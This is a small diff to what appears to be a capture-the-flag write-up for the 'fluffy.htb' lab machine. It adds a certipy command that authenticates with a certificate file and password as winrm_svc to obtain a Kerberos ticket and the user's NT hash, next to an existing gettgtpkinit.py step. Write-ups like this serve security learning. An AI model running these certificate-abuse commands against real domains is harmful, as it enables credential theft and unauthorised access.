@@ -17,6 +17,10 @@ then we need to get TGT with the outputted certs:
 ```bash
 gettgtpkinit.py -cert-pfx $CERT.PFX -pfx-pass $PASS fluffy.htb/winrm_svc winrm_svc.ccache
 
+
+# can be done with certipy too:
+
+certipy auth -pfx TCnbNbni.pfx -password 'ZUlqKYkrWtrdRqPZqkMl' -username winrm_svc -domain fluffy.htb -dc-ip 10.10.11.69
 ```
 this command will get us AS-REP encryption key. This is the **user's NT hash** derived from the AS-REP response.
 
